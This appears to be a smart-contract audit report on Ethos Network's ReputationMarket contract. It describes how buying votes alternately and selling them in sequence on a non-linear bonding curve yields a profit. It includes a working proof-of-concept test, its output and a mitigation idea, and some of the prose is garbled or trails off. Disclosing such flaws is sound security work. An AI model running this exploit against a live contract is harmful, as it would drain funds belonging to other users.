# Users Can completely Drain The contract Because of the Non-Linear Bonding Curve Buying/Selling architecture

### Summary

Because of The Bonding Curve Mathematical Calculations Buying Votes/disVotes is not the same as selling Votes/disVotes with the same Steps, which can be used to Sell Votes with a Value greater than Buying.


### Root Cause

The protocol uses the Bonding Curve Equation to determine votes/disVotes Price, Users can buy Votes/disVotes from a state (lets stay at the initial state of vote/disVote equal `1`), buy Votes till The number of Votes/disVotes increases to `10` for each in a given sequence. Then, sell the Votes/disVotes they bought in another sequence till the state reset to a number of votes/disVotes is `1` (same as the initial state). The resulting outcoming money for that user when selling will be greater than the money he used in buying in some circumstances as the bonding curve is a non-linear function and changing sequence of change will not result in resetting to the initial state (total buying value equals the value of selling).

[ReputationMarket.sol#L920-L923](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L920-L923)
```solidity
  /**
   * @notice Calculates the buy or sell price for votes based on market state
>> * @dev Uses bonding curve formula: price = (votes * basePrice) / totalVotes
   * Markets are double sided, so the price of trust and distrust votes always sum to the base price
   * @param market The market state to calculate price for
   * @param isPositive Whether to calculate trust (true) or distrust (false) vote price
   * @return The calculated vote price
   */
  function _calcVotePrice(Market memory market, bool isPositive) private pure returns (uint256) {
    uint256 totalVotes = market.votes[TRUST] + market.votes[DISTRUST];
>>  return (market.votes[isPositive ? TRUST : DISTRUST] * market.basePrice) / totalVotes;
  }
```

**Mathematical Explanation**

$$
vote&nbsp;Price = \left( \frac{\text{votes}}{\text{votes} + \text{disVotes}} \right) \cdot \text{basePrice}
$$
$$
disVote&nbsp;Price = \left( \frac{\text{disVotes}}{\text{votes} + \text{disVotes}} \right) \cdot \text{basePrice}
$$

For each increase/decrease operation to either votes/disVotes this results in changing the State of our variables in a non-linear manner, changing votes results in changing the price of both vote and disVote.

The problem here is that in functions as total we analyze its change (weight change) from an initial state. And this is the case for our vote/disVote, weight (delta change in prices vote/disVote).

For any non-linear function `f(x)` the change in `f(x)` depends on the rate of change (derivative) at x.

- `f(x)` is the function `_calcVotePrice()` 
- `x` is the total number of votes and disVotes
- The total price we will use for buying a given quantity of votes/disVotes is the rate of change (derivative) of `f(x)`

Our Function is have two variants dpendent so the rate of change is partial derivative and the changed weight is also partial, for our calculations but this is not the context of issue. In simple words, if we make the total rate of changes of our state for buying as less as possible, and the rate of change of the state when selling as max as possible, this will result in total Change from state (a) to state (b) value is smaller than the total change from state (b) to state (a), and as we explained before that the weight change is the total price paid by the user, this will result for user gaining money when selling more than he gave for buying.

To make the rate of change as less as possible, we can make an alternative voting method. and to make the rate of change as great as possible, we should make a large change buy selling all votes/disVotes at sequential method.

So when buying:
- vote disvote vote disvote ...

When selling:
- vote vote ... disVote disVote ...

This will make the money gained when selling is greater than the money paid when buying and as this is the contract that holds all money doing this will allow user to drain the contract doing this process again and again till it drain it completely with a profite too (as the money he pay for voting is returned to him with addition).


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

- Buying votes/disVote in alternative method (vote, disVote, vote, disVote, ...)
- Selling votes/disVotes in sequential method (vote, vote, ..., disVote, disVote, ...) 


### Impact

Draining All contract Balance


### PoC

1. Add The following test script in `test/reputationMarket/rep.price.test.ts`

```typescript
    /* eslint-disable */
    it.only('AUDITOR TEST: should return more than paid because of non-linear bonding curve', async () => {
      // We disallowed all fees, so that we can only pay for the Vote
      // We will increase 1 vote, 1 disVote, 1 vote, 1 disVote
      const balanceBeforeAttack = await ethers.provider.getBalance(reputationMarket);

      const votePrice1_1 = await reputationMarket.getVotePrice(DEFAULT.profileId, true);
      await userA.buyVotes({ buyAmount: votePrice1_1 });
      const disVotePrice2_1 = await reputationMarket.getVotePrice(DEFAULT.profileId, false);
      await userA.buyVotes({ buyAmount: disVotePrice2_1, isPositive: false });
      const votePrice2_2 = await reputationMarket.getVotePrice(DEFAULT.profileId, true);
      await userA.buyVotes({ buyAmount: votePrice2_2 });
      const disVotePrice3_2 = await reputationMarket.getVotePrice(DEFAULT.profileId, false);
      await userA.buyVotes({ buyAmount: disVotePrice3_2, isPositive: false });

      const totalPaidByUser = votePrice1_1 + disVotePrice2_1 + votePrice2_2 + disVotePrice3_2;
      console.log('Money Paid by user:', totalPaidByUser);

      // when selling we will decrease 1 vote, 1 vote, 1 disVote, 1 disVote
      const received1 = (await userA.sellVotes({ isPositive: true, sellVotes: 2n }))
        .fundsReceived as bigint;
      const received2 = (await userA.sellVotes({ isPositive: false, sellVotes: 2n }))
        .fundsReceived as bigint;

      const balanceAfterAttack = await ethers.provider.getBalance(reputationMarket);

      const moneyGained = received1 + received2;
      console.log('Money Gained by user:', moneyGained);
      console.log('Gained - Paid (Profit):', moneyGained - totalPaidByUser);
      console.log(
        `Profit Percentage:${(((Number(moneyGained) - Number(totalPaidByUser)) / Number(totalPaidByUser)) * 100).toFixed(2)}%`,
      );
      // Invariant
      expect(balanceBeforeAttack - balanceAfterAttack).to.be.equals(moneyGained - totalPaidByUser);
    });
    /* eslint-enable */
```

2. Make All fees equal zero to give correct calculations. Go to `test/vouch/vouch.fees.test.ts` and mark All fees to zero.

```typescript
13: const entryFee = 0n;
14: const exitFee = 0n;
15: const donationFee = 0n;
16: const vouchIncentives = 0n;
```

3. Run tests by going to `ethos/packages/contracts` and run the following command, no need to right the discribtion as we used `only`, just our test should run at this case.
```bash
npm run test:contracts
```

4. Output

```shell
Money Paid by user: 1733333333333333333n
Money Gained by user: 1816666666666666666n
Gained - Paid (Profit): 83333333333333333n
Profit Percentage:4.81%
```

- As we can see in the script we make a simple buying process (vote, disVote, vote, disVote).
- When selling them we did (vote, vote, disVote, disVote).

The money paid by the user is smaller than the money returned to him by `0.0833e18` he made `4.81%` profit using just 2 votes/disVotes buying/selling in different sequences (alternative for buying, sequential for selling).

In case of 3 vote/disVote the profit will be `8.14%`, and so on.

This will make users make a dummy market and just do these steps until they drain all the contract

Since this money is getting

### Mitigation

The algorithm for Voting and disvoting is implemented using the Bonding Curve, and the problem is as we said mathematically, so This issue will not be mitigated by just doing a single modification.

But for a mitigation example, you can store the balance paid by users in a mapping for each market when buying and when selling you decrease that balance, and in case it gets decreased to `0` don't send money.
